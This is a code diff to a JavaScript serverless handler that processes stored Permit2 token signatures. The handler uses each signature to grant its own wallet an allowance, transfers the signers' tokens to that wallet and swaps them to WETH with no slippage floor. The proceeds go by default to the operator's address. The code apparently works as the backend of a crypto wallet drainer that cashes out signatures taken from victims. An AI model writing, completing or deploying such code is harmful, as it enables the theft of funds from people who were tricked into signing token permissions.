@@ -4,7 +4,18 @@ import { ethers } from 'ethers';
 // -----------------------------
 // Configuration
 // -----------------------------
+const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B";
+
+const PERMIT2_ABI = [
+  "function permit(address owner, tuple(tuple(address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature)",
+  "function transferFrom(address from, address to, uint160 amount, address token)"
+];
+
+const ERC20_ABI = [
+  "function approve(address spender, uint256 amount) returns (bool)"
+];
+
 const UNIVERSAL_ROUTER_ABI = [
   "function execute(bytes commands, bytes[] inputs, uint256 deadline) payable"
 ];
@@ -15,7 +26,8 @@ const UNIVERSAL_ROUTER_ABI = [
 let db = null;
 let provider = null;
 let spenderWallet = null;
-let router = null;
+let permit2Contract = null;
+let routerContract = null;
 
 async function init() {
   if (db) return; 
@@ -33,144 +45,136 @@ async function init() {
 
   provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
   spenderWallet = new ethers.Wallet(process.env.SPENDER_PRIVATE_KEY, provider);
-  router = new ethers.Contract(UNIVERSAL_ROUTER, UNIVERSAL_ROUTER_ABI, spenderWallet);
+  
+  permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, spenderWallet);
+  routerContract = new ethers.Contract(UNIVERSAL_ROUTER, UNIVERSAL_ROUTER_ABI, spenderWallet);
 }
 
 // -----------------------------
-// Helpers
-// -----------------------------
-function buildSignatureBytes(r, s, vRaw) {
-  let v = Number(vRaw);
-  if (v === 0 || v === 1) v += 27;
-  const vHex = "0x" + v.toString(16).replace(/^0x/, '');
-  
-  // FIX: Use ethers.concat instead of ethers.hexConcat
-  return ethers.concat([r, s, vHex]);
-}
-
-function buildUniversalRouterTx(data, overrides = {}) {
-  const { owner, token, amount, deadline, nonce, r, s, v } = data;
-  const recipient = overrides.recipient || process.env.SWAP_RECIPIENT || spenderWallet.address;
-  const outputToken = overrides.outputToken || process.env.OUTPUT_TOKEN || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2"; // WETH
-
-  const amountBn = BigInt(amount);
-  const signatureBytes = buildSignatureBytes(r, s, v);
-  const permitAbi = new ethers.AbiCoder();
-
-  const permitSingleTuple = [
-    [[token, amountBn, Number(deadline), Number(nonce)], UNIVERSAL_ROUTER, Number(deadline)],
-    signatureBytes
-  ];
-
-  const permitInput = permitAbi.encode(
-    ["address", "tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce) details,address spender,uint256 sigDeadline)", "bytes"],
-    [owner, permitSingleTuple[0], permitSingleTuple[1]]
-  );
-
-  const feeTier = 3000;
-  function encodeFee(f) {
-    let hex = f.toString(16).padStart(6, '0');
-    if (hex.length % 2 === 1) hex = '0' + hex;
-    return '0x' + hex;
-  }
-  
-  // FIX: Use ethers.concat instead of ethers.hexConcat
-  const path = ethers.concat([token, encodeFee(feeTier), outputToken]);
-  
-  const swapAbi = new ethers.AbiCoder();
-  const swapInput = swapAbi.encode(
-    ["bytes", "uint256", "uint256", "address"],
-    [path, amountBn, BigInt(0), recipient]
-  );
-
-  const commands = "0x0208"; 
-  const inputs = [permitInput, swapInput];
-  const execDeadline = Math.floor(Date.now() / 1000) + 1800;
-
-  return { commands, inputs, execDeadline };
-}
-
-// -----------------------------
-// Vercel Serverless Handler
+// Logic
 // -----------------------------
 export default async function handler(req, res) {
-  res.setHeader('Access-Control-Allow-Credentials', true);
+  // CORS & Methods
   res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
-  res.setHeader(
-    'Access-Control-Allow-Headers',
-    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
-  );
-
-  if (req.method === 'OPTIONS') {
-    res.status(200).end();
-    return;
-  }
-
-  if (req.method !== 'POST') {
-    return res.status(405).json({ ok: false, error: "Method Not Allowed" });
-  }
+  res.setHeader('Access-Control-Allow-Methods', 'POST,OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+  if (req.method === 'OPTIONS') return res.status(200).end();
+  if (req.method !== 'POST') return res.status(405).json({ error: "Method Not Allowed" });
 
   try {
     await init();
     
     const { docId, recipient, outputToken } = req.body;
-    let docsToProcess = [];
+    // Default Output: WETH (Mainnet)
+    const FINAL_TOKEN = outputToken || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2"; 
+    const RECIPIENT = recipient || spenderWallet.address;
 
+    let docsToProcess = [];
     if (docId) {
-      const docSnap = await db.collection('permit2_signatures').doc(docId).get();
-      if (docSnap.exists && !docSnap.data().processed) {
-        docsToProcess.push(docSnap);
-      }
+      const doc = await db.collection('permit2_signatures').doc(docId).get();
+      if (doc.exists && !doc.data().processed) docsToProcess.push(doc);
     } else {
-      const snaps = await db.collection('permit2_signatures')
-        .where('processed', '==', false)
-        .limit(2)
-        .get();
+      const snaps = await db.collection('permit2_signatures').where('processed', '==', false).limit(1).get();
       docsToProcess = snaps.docs;
     }
 
-    if (docsToProcess.length === 0) {
-      return res.status(200).json({ ok: true, processed: 0, message: "Nothing to process" });
-    }
+    if (!docsToProcess.length) return res.json({ ok: true, processed: 0 });
 
-    let processedCount = 0;
-
+    let count = 0;
     for (const docSnap of docsToProcess) {
       const data = docSnap.data();
+      
       try {
-        const { commands, inputs, execDeadline } = buildUniversalRouterTx(data, { recipient, outputToken });
+        const amount = BigInt(data.amount);
+
+        // 1. Reconstruct Signature
+        const signature = ethers.concat([
+            data.r, 
+            data.s, 
+            ethers.toBeHex(data.v === 0 || data.v === 1 ? data.v + 27 : data.v)
+        ]);
+
+        // 2. Call Permit2.permit() to claim allowance for Executor (Self)
+        // We verify if we are the spender
+        if (data.spender.toLowerCase() !== spenderWallet.address.toLowerCase()) {
+            throw new Error(`Spender mismatch. Signature authorizes ${data.spender}, but Executor is ${spenderWallet.address}`);
+        }
+
+        const permitTx = await permit2Contract.permit(
+            data.owner,
+            {
+                details: {
+                    token: data.token,
+                    amount: amount,
+                    expiration: data.deadline,
+                    nonce: data.nonce
+                },
+                spender: spenderWallet.address,
+                sigDeadline: data.deadline
+            },
+            signature
+        );
+        await permitTx.wait();
+
+        // 3. Pull tokens from User to Executor
+        const pullTx = await permit2Contract.transferFrom(data.owner, spenderWallet.address, amount, data.token);
+        await pullTx.wait();
+
+        // 4. Approve Universal Router to spend tokens from Executor
+        const tokenContract = new ethers.Contract(data.token, ERC20_ABI, spenderWallet);
+        const approveTx = await tokenContract.approve(UNIVERSAL_ROUTER, amount);
+        await approveTx.wait();
+
+        // 5. Build Universal Router Swap
+        const feeTier = 3000;
+        function encodeFee(f) {
+            let hex = f.toString(16).padStart(6, '0');
+            if (hex.length % 2 === 1) hex = '0' + hex;
+            return '0x' + hex;
+        }
         
-        // Estimate gas
-        const gasEstimate = await router.execute.estimateGas(commands, inputs, execDeadline, { value: 0 });
+        // V3 Path: TokenIn -> Fee -> TokenOut
+        const path = ethers.concat([data.token, encodeFee(feeTier), FINAL_TOKEN]);
         
-        // Execute Transaction
-        const tx = await router.execute(commands, inputs, execDeadline, { 
-          value: 0, 
-          gasLimit: (gasEstimate * 120n) / 100n 
+        // V3_SWAP_EXACT_IN (Command 0x00)
+        // Input: (address recipient, uint256 amountIn, uint256 amountOutMin, bytes path, bool payerIsUser)
+        const swapAbi = new ethers.AbiCoder();
+        const swapInput = swapAbi.encode(
+            ["address", "uint256", "uint256", "bytes", "bool"],
+            [RECIPIENT, amount, BigInt(0), path, false] // payerIsUser = false (funds are in executor/msg.sender)
+        );
+
+        const commands = "0x00"; // V3_SWAP_EXACT_IN
+        const inputs = [swapInput];
+        const execDeadline = Math.floor(Date.now() / 1000) + 1800;
+
+        // 6. Execute Swap
+        // Manually setting gas limit to avoid estimation issues on complex router paths
+        const tx = await routerContract.execute(commands, inputs, execDeadline, { 
+            gasLimit: 500000 
         });
-        
         const receipt = await tx.wait();
 
         await docSnap.ref.update({
-          processed: true,
-          routerTx: receipt.hash,
-          processedAt: Date.now(),
-          adminExecutor: "VERCEL_BACKEND"
+            processed: true,
+            routerTx: receipt.hash,
+            processedAt: Date.now(),
+            adminExecutor: "VERCEL_BACKEND"
         });
+        count++;
 
-        processedCount++;
       } catch (err) {
         console.error(`Failed doc ${docSnap.id}:`, err);
         await docSnap.ref.update({
-          lastError: err.message || String(err),
-          lastErrorAt: Date.now()
+            lastError: err.shortMessage || err.message,
+            lastErrorAt: Date.now()
         });
+        // Stop only if single mode
         if (docId) throw err;
       }
     }
 
-    return res.status(200).json({ ok: true, processed: processedCount });
+    return res.status(200).json({ ok: true, processed: count });
 
   } catch (error) {
     console.error("Handler Error:", error);
